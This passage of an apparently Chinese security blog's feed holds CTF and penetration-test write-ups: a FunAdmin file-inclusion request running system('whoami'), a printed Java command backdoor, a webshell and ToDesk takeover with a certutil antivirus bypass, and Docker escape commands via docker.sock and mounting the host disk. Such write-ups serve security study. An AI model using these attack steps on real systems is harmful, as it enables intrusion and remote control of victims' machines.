class="hljs-variable">$index</span>):<span class="hljs-variable">$res</span>;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">install</span>(<span class="hljs-variable">$addon</span>,<span class="hljs-string">&#x27;local&#x27;</span>);<br>            &#125;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">success</span>(<span class="hljs-string">&#x27;upload success&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>&#x2F;vendor&#x2F;funadmin&#x2F;fun-addons&#x2F;src&#x2F;helper&#x2F;ZipHelper.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  解压文件</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> $zipFile 相对文件路劲</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> $folderPath 相对文件夹路劲</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unzip</span>(<span class="hljs-params"> <span class="hljs-variable">$zipFile</span>,<span class="hljs-variable">$folderPath</span>,<span class="hljs-variable">$addon</span>=<span class="hljs-number">0</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// Initialize archive object</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">class_exists</span>(<span class="hljs-string">&#x27;ZipArchive&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">\Exception</span>(<span class="hljs-string">&#x27;ZinArchive not find&#x27;</span>);<br>    &#125;<br>    <span class="hljs-variable">$zip</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">\ZipArchive</span>();<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$zipFile</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">\Exception</span>(<span class="hljs-string">&#x27;Unable to open the zip file&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$folderPath</span>)) &#123;<br>        @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$folderPath</span>, <span class="hljs-number">0755</span>);<br>    &#125;<br>    <span class="hljs-variable">$fileDir</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">getNameIndex</span>(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;/&#x27;</span>);<br>    <span class="hljs-comment">//解压压缩包</span><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">extractTo</span>(<span class="hljs-variable">$folderPath</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">\Exception</span>(<span class="hljs-string">&#x27;Unable to extract the file&#x27;</span>);<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$fileDir</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以发现虽然报错了，但是依然会解压到addons目录下</p><p><img src="/img/awd/ccb-cms-5.png"></p><p>但是无法访问到，这里需要用到文件上传+文件包含组合拳进行利用</p><p>&#x2F;app&#x2F;backend&#x2F;controller&#x2F;Ajax.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> \think\response\Jsonp</span><br><span class="hljs-comment"> * 自动加载语言函数</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">lang</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/javascript&#x27;</span>);<br>    <span class="hljs-variable">$name</span> = <span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&quot;controllername&quot;</span>);<br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">parse_name</span>(<span class="hljs-variable">$name</span>, <span class="hljs-number">1</span>));<br>    <span class="hljs-variable">$app</span> = <span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&quot;app&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">jsonp</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">loadlang</span>(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$app</span>))-&gt;<span class="hljs-title function_ invoke__">code</span>(<span class="hljs-number">200</span>)-&gt;<span class="hljs-title function_ invoke__">options</span>([<br>        <span class="hljs-string">&#x27;var_jsonp_handler&#x27;</span> =&gt; <span class="hljs-string">&#x27;callback&#x27;</span>,<br>        <span class="hljs-string">&#x27;default_jsonp_handler&#x27;</span> =&gt; <span class="hljs-string">&#x27;jsonpReturn&#x27;</span>,<br>        <span class="hljs-string">&#x27;json_encode_param&#x27;</span> =&gt; JSON_PRETTY_PRINT | JSON_FORCE_OBJECT |JSON_UNESCAPED_UNICODE,<br>    ])-&gt;<span class="hljs-title function_ invoke__">allowCache</span>(<span class="hljs-literal">true</span>)-&gt;<span class="hljs-title function_ invoke__">expires</span>(<span class="hljs-number">7200</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进loadlang方法</p><p>&#x2F;app&#x2F;common&#x2F;controller&#x2F;Backend.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loadlang</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$app</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$lang</span> = <span class="hljs-title function_ invoke__">cookie</span>(<span class="hljs-title function_ invoke__">config</span>(<span class="hljs-string">&#x27;lang.cookie_var&#x27;</span>));<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$app</span> &amp;&amp; <span class="hljs-variable">$app</span>!==<span class="hljs-string">&#x27;backend&#x27;</span>)&#123;<br>        <span class="hljs-variable">$res</span> =  <span class="hljs-title class_">Lang</span>::<span class="hljs-title function_ invoke__">load</span>([<br>            <span class="hljs-variable">$this</span>-&gt;app-&gt;<span class="hljs-title function_ invoke__">getBasePath</span>() .<span class="hljs-string">&#x27;backend&#x27;</span>. DS . <span class="hljs-string">&#x27;lang&#x27;</span> . DS . <span class="hljs-variable">$lang</span> . <span class="hljs-string">&#x27;.php&#x27;</span>,<br>            <span class="hljs-variable">$this</span>-&gt;app-&gt;<span class="hljs-title function_ invoke__">getBasePath</span>() .<span class="hljs-variable">$app</span>. DS . <span class="hljs-string">&#x27;lang&#x27;</span> . DS . <span class="hljs-variable">$lang</span>  . <span class="hljs-string">&#x27;.php&#x27;</span>,<br>            <span class="hljs-variable">$this</span>-&gt;app-&gt;<span class="hljs-title function_ invoke__">getBasePath</span>() .<span class="hljs-variable">$app</span>. DS . <span class="hljs-string">&#x27;lang&#x27;</span> . DS . <span class="hljs-variable">$lang</span> . DS . <span class="hljs-title function_ invoke__">str_replac</span>(<span class="hljs-string">&#x27;.&#x27;</span>, DS, <span class="hljs-variable">$name</span>) . <span class="hljs-string">&#x27;.php&#x27;</span>,<br>        ]);<br>   &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-title class_">Lang</span>::<span class="hljs-title function_ invoke__">load</span>([<br>            <span class="hljs-variable">$this</span>-&gt;app-&gt;<span class="hljs-title function_ invoke__">getAppPath</span>() . <span class="hljs-string">&#x27;lang&#x27;</span> . DS . <span class="hljs-variable">$lang</span> . <span class="hljs-string">&#x27;.php&#x27;</span>,<br>            <span class="hljs-variable">$this</span>-&gt;app-&gt;<span class="hljs-title function_ invoke__">getAppPath</span>() . <span class="hljs-string">&#x27;lang&#x27;</span> . DS . <span class="hljs-variable">$lang</span> . DS . <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;.&#x27;</span>, DS,<span class="hljs-variable">$name</span>) . <span class="hljs-string">&#x27;.php&#x27;</span>,<br>        ]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>很明显，从 lang.cookie_var 配置中获取一个cookie值并进行文件包含</p><p>查看cookie_var的名字</p><p>&#x2F;config&#x2F;lang.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">return</span> [<br>    <span class="hljs-comment">// 默认语言</span><br>    <span class="hljs-string">&#x27;default_lang&#x27;</span>    =&gt; <span class="hljs-title class_">Env</span>::<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;lang.default_lang&#x27;</span>, <span class="hljs-string">&#x27;zh-cn&#x27;</span>),<br>    <span class="hljs-comment">// 允许的语言列表</span><br>    <span class="hljs-string">&#x27;allow_lang_list&#x27;</span> =&gt; [<span class="hljs-string">&#x27;zh-cn&#x27;</span>,<span class="hljs-string">&#x27;en-us&#x27;</span>],<br>    <span class="hljs-comment">// 多语言自动侦测变量名 / 自动侦测的GET变量名</span><br>    <span class="hljs-string">&#x27;detect_var&#x27;</span>      =&gt; <span class="hljs-string">&#x27;lang&#x27;</span>,<br>    <span class="hljs-comment">// 是否使用Cookie记录</span><br>    <span class="hljs-string">&#x27;use_cookie&#x27;</span>      =&gt; <span class="hljs-literal">true</span>,<br>    <span class="hljs-comment">// 多语言cookie变量</span><br>    <span class="hljs-string">&#x27;cookie_var&#x27;</span>      =&gt; <span class="hljs-string">&#x27;think_lang&#x27;</span>,<br>    <span class="hljs-comment">// 扩展语言包</span><br>    <span class="hljs-string">&#x27;extend_list&#x27;</span>     =&gt; [],<br>    <span class="hljs-comment">// Accept-Language转义为对应语言包名称</span><br>    <span class="hljs-string">&#x27;accept_language&#x27;</span> =&gt; [<br>        <span class="hljs-string">&#x27;zh-hans-cn&#x27;</span> =&gt; <span class="hljs-string">&#x27;zh-cn&#x27;</span>,<br>    ],<br>    <span class="hljs-comment">// 是否支持语言分组</span><br>    <span class="hljs-string">&#x27;allow_group&#x27;</span>     =&gt; <span class="hljs-literal">true</span>,<br>];<br></code></pre></td></tr></table></figure><p>因为是全局变量，所以任何地方都可以调用</p><p>包含的时候注意后缀 .php 已经存在了，不需要再写</p><p><img src="/img/awd/ccb-cms-4.png"></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">POST / HTTP/1.1<br>Host: 0dbaba9b-169b-4afb-ab9d-71f60e228260.ctfd.lewiserii.top:8080<br>Cookie: think_lang=/../../../addons/shell;<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 19<br><br>a=system(&#x27;whoami&#x27;);<br></code></pre></td></tr></table></figure><p><strong>修复</strong></p><p>对 $lang 进行过滤即可</p><h1 id="DocToolkit"><a href="#DocToolkit" class="headerlink" title="DocToolkit"></a>DocToolkit</h1><h2 id="漏洞1-默认后门"><a href="#漏洞1-默认后门" class="headerlink" title="漏洞1-默认后门"></a>漏洞1-默认后门</h2><p>存在默认后门</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.doctoolkit.controller.test;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@RequestMapping(&#123;&quot;/test&quot;&#125;)</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-comment">/* loaded from: DocToolkit-0.0.1-SNAPSHOT.jar:BOOT-INF/classes/com/example/doctoolkit/controller/test/TestController.class */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestController</span> &#123;<br>    <span class="hljs-meta">@RequestMapping(&#123;&quot;/backd0or&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">backdoor</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;cmd&quot;)</span> String command)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">if</span> (command != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">osType</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>);<br>            <span class="hljs-keyword">if</span> (osType != <span class="hljs-literal">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="hljs-string">&quot;windows&quot;</span>)) &#123;<br>                isLinux = <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            String[] cmds = isLinux ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, command&#125; : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, command&#125;;<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmds).start();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> process.getInputStream().read(bytes);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes, <span class="hljs-number">0</span>, len);<br>            <span class="hljs-keyword">return</span> output;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>攻击：</strong></p><p><code>/test/backd0or?cmd=cat /flag</code></p><p><img src="/img/awd/ccb-DocToolkit-1.png"></p><p><strong>修复：</strong></p><p>没修复成功。。</p><h2 id="漏洞2-shiro反序列化"><a href="#漏洞2-shiro反序列化" class="headerlink" title="漏洞2-shiro反序列化"></a>漏洞2-shiro反序列化</h2><p>有shiro依赖</p><p>在shiro的配置文件中发现了固定秘钥</p><p><img src="/img/awd/ccb-DocToolkit-2.png"></p><p>直接用工具打就好了，然后抓流量进行批量</p><p><img src="/img/awd/ccb-DocToolkit-3.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;rank: 6&lt;/p&gt;
&lt;h1 id=&quot;tomcat&quot;&gt;&lt;a href=&quot;#tomcat&quot; class=&quot;headerlink&quot; title=&quot;tomcat&quot;&gt;&lt;/a&gt;tomcat&lt;/h1&gt;&lt;h2 id=&quot;漏洞1-文件上传getshell&quot;&gt;&lt;a href=&quot;#漏洞1-文件</summary>
      
    
    
    
    <category term="wp" scheme="https://www.dr0n.top/categories/wp/"/>
    
    
    <category term="awd" scheme="https://www.dr0n.top/tags/awd/"/>
    
    <category term="长城杯" scheme="https://www.dr0n.top/tags/%E9%95%BF%E5%9F%8E%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>xx市学校食堂原辅材料统一配送管理系统</title>
    <link href="https://www.dr0n.top/posts/62ba3513/"/>
    <id>https://www.dr0n.top/posts/62ba3513/</id>
    <published>2024-02-23T12:00:00.000Z</published>
    <updated>2024-03-21T10:35:02.191Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>2023.8月合法授权进行渗透测试，现已修复</p></blockquote><h1 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h1><p>后台发现后直接就是一个弱口令</p><p>admin&#x2F;7654321</p><p><img src="/img/%E5%86%85%E7%BD%91/intranet1-1.png"></p><p>测试后发现公告处存在任意文件上传</p><p><img src="/img/%E5%86%85%E7%BD%91/intranet1-2.png"></p><p>上传一个jsp</p><p><img src="/img/%E5%86%85%E7%BD%91/intranet1-3.png"></p><p>冰蝎连接后直接拿下</p><p><img src="/img/%E5%86%85%E7%BD%91/intranet1-4.png"></p><h1 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h1><p>接着进行当前主机的信息收集</p><p>软件：火绒，todesk，360浏览器等<br>OS：Microsoft Windows Server 2016 Standard<br>网段：10.77.0.0&#x2F;24</p><p><img src="/img/%E5%86%85%E7%BD%91/intranet1-5.png"></p><h2 id="远程连接"><a href="#远程连接" class="headerlink" title="远程连接"></a>远程连接</h2><blockquote><p>看到目标安装了todesk后就突发奇想，想着能不能连接上看看</p></blockquote><p>这里用的方法是上传todesk+nircmd实现远程连接</p><p>Todesk精简版：<a href="https://dl.todesk.com/windows/ToDesk_Lite.exe">https://dl.todesk.com/windows/ToDesk_Lite.exe</a><br>Nircmd: <a href="http://www.nirsoft.net/utils/nircmd.html">http://www.nirsoft.net/utils/nircmd.html</a></p><hr><p>正常情况应该是运行ToDesk_Lite.exe后截图可以直接看到密码，如下图</p><p><img src="/img/%E5%86%85%E7%BD%91/intranet1-7.png"></p><hr><p>但是当时的情况是上传完后截图发现有一个弹窗</p><p>截图命令 <code>nircmd.exe savescreenshot D:\2.png</code></p><p><img src="/img/%E5%86%85%E7%BD%91/intranet1-6.png"></p><p>比todesk的优先级高，这样会看不到窗口程序，所以需要先杀掉弹窗</p><p>tasklist查看，得到进程名称<code>MusNotificationUx.exe</code><br>杀进程：<code>taskkill /IM &quot;MusNotificationUx.exe&quot;</code></p><p>如果还有其他窗口，可以使用vbs命令清空</p><figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vbs"><span class="hljs-keyword">Dim</span> objSHA<br><span class="hljs-keyword">Set</span> objSHA = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Shell.Application&quot;</span>)<br>objSHA.ToggleDesktop<br><span class="hljs-keyword">Set</span> objSHA = <span class="hljs-literal">Nothing</span><br><br>且火绒不允许创建vbs文件，可以用系统自带的certutil实现bypass<br>certutil -encode <span class="hljs-number">1.</span>vbs <span class="hljs-number">1.</span>txt<br>certutil -decode <span class="hljs-number">1.</span>txt <span class="hljs-number">1.</span>vbs<br></code></pre></td></tr></table></figure><hr><p>清空后再次运行并截图</p><p><img src="/img/%E5%86%85%E7%BD%91/intranet1-8.png"></p><p>因为运行的是系统本身安装的todesk，而不是精简版，所以还需要获取连接密码</p><p>可以找到config.ini文件中的hash，复制到本地，在本地启动todesk拿到密码</p><p><img src="/img/%E5%86%85%E7%BD%91/intranet1-9.png"></p><p><img src="/img/%E5%86%85%E7%BD%91/intranet1-10.png"></p><p>至此实现todesk连接</p><p><img src="/img/%E5%86%85%E7%BD%91/intranet1-12.png"></p><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>就不详细放图了，都是同一网段的</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">AVA互动管理软件x1<br>HDMx1<br>Grandstream GXP1610 企业ip电话管理x4<br>海康威视摄像头x2<br>VBC网络核心智能管理系统x1<br>h3c设备x1<br>主机getshellx3<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;2023.8月合法授权进行渗透测试，现已修复&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;外网&quot;&gt;&lt;a href=&quot;#外网&quot; class=&quot;headerlink&quot; title=&quot;外网&quot;&gt;&lt;/a&gt;外网&lt;/h1&gt;&lt;p&gt;后台发现后直接就是一个弱口</summary>
      
    
    
    
    <category term="内网" scheme="https://www.dr0n.top/categories/%E5%86%85%E7%BD%91/"/>
    
    
    <category term="内网渗透" scheme="https://www.dr0n.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="实战" scheme="https://www.dr0n.top/tags/%E5%AE%9E%E6%88%98/"/>
    
  </entry>
  
  <entry>
    <title>Be-a-Docker-Escaper-4 &amp; Be-a-Cloud-Hacker</title>
    <link href="https://www.dr0n.top/posts/90615d01/"/>
    <id>https://www.dr0n.top/posts/90615d01/</id>
    <published>2024-01-27T05:00:00.000Z</published>
    <updated>2024-03-21T11:56:07.495Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>题目来自2024年第六届RWCTF体验赛</p></blockquote><p>一道关于容器逃逸的题目</p><h2 id="Be-a-Docker-Escaper-4"><a href="#Be-a-Docker-Escaper-4" class="headerlink" title="Be-a-Docker-Escaper-4"></a>Be-a-Docker-Escaper-4</h2><p>ssh连上后可以通过<code>ps -aux</code>命令看到这个容器的启动命令</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs docker">docker <span class="hljs-keyword">run</span><span class="language-bash"> --<span class="hljs-built_in">rm</span> -it --pid=host --security-opt=apparmor=unconfined ubuntu bash</span><br></code></pre></td></tr></table></figure><p><img src="/img/docker/docker-e-1.png"></p><p>这里介绍下<code>--pid=host</code>这个参数，指定为host后会使用宿主机的pid namespace。可以通过ps命令看到容器外的进程</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs docker">--pid=<span class="hljs-string">&quot;&quot;</span>  : Set the PID (Process) Namespace mode for the container,<br>             <span class="hljs-string">&#x27;container:&lt;name|id&gt;&#x27;</span>: joins another container<span class="hljs-string">&#x27;s PID namespace</span><br><span class="hljs-string">             &#x27;</span>host<span class="hljs-string">&#x27;: use the host&#x27;</span>s PID namespace inside the container<br></code></pre></td></tr></table></figure><p>因为容器共享了<code>pid</code>，并且关闭了apparmor，所以可以利用某些进程的<code>/proc/[pid]/root</code>符号链接实现容器逃逸</p><p>先找到宿主机上以非 root 用户运行的进程<br>很明显有个sleep进程</p><p><img src="/img/docker/docker-e-2.png"></p><p>然后在容器中创建一个 UID 和 GID 与目标进程 UID 和 GID 相同的用户<br>这里的uid很明显是1000，gid则需要猜测（基本从1000开始，这一题中是1001）</p><p><img src="/img/docker/docker-e-3.png"></p><p>最后用 su 命令切换到该用户，就有权限访问目标进程的 &#x2F;proc&#x2F;[pid]&#x2F;root 了</p><p><img src="/img/docker/docker-e-4.png"></p><p>非预期解法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> fd <span class="hljs-keyword">in</span> `find /proc/*/root`; <span class="hljs-keyword">do</span> <span class="hljs-built_in">ls</span> -al <span class="hljs-variable">$fd</span> | grep \&gt;; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h2 id="Be-a-Cloud-Hacker"><a href="#Be-a-Cloud-Hacker" class="headerlink" title="Be-a-Cloud-Hacker"></a>Be-a-Cloud-Hacker</h2><p>先提升权限</p><p>创建特权容器</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text">apt update<br>apt install docker.io<br># cat /proc/$pid/root/etc/group得到gid为1000，将原来的替换成1000<br>sed -i &#x27;s/docker:x:103:/docker:x:1000:/g&#x27; /etc/group<br>usermod -aG docker exp<br><br>su exp<br>pid=$(pidof sleep)<br>docker -H unix:///proc/$pid/root/run/docker.sock run -it --privileged ubuntu bash<br></code></pre></td></tr></table></figure><p>在特权容器中逃逸</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">mkdir /tmp/m<br>mount /dev/sda1 /tmp/m<br></code></pre></td></tr></table></figure><p>最后找cloud-init的配置文件中的密码就行了（默认在&#x2F;var&#x2F;lib&#x2F;cloud）</p><p><img src="/img/docker/docker-e-5.png"></p><hr><p>参考文章：<a href="https://www.anquanke.com/post/id/290540">一个未公开的容器逃逸方式</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;题目来自2024年第六届RWCTF体验赛&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;一道关于容器逃逸的题目&lt;/p&gt;
&lt;h2 id=&quot;Be-a-Docker-Escaper-4&quot;&gt;&lt;a href=&quot;#Be-a-Docker-Escaper-4&quot; cl</summary>
      
    
    
    
    <category term="docker" scheme="https://www.dr0n.top/categories/docker/"/>
    
    
    <category term="docker" scheme="https://www.dr0n.top/tags/docker/"/>
    
    <category term="逃逸" scheme="https://www.dr0n.top/tags/%E9%80%83%E9%80%B8/"/>
    
  </entry>
  
  <entry>
    <title>python反序列化</title>
    <link href="https://www.dr0n.top/posts/ab2b72a2/"/>
    <id>https://www.dr0n.top/posts/ab2b72a2/</id>
    <published>2024-01-01T01:00:00.000Z</published>
    <updated>2024-04-27T14:04:54.219Z</updated>
    
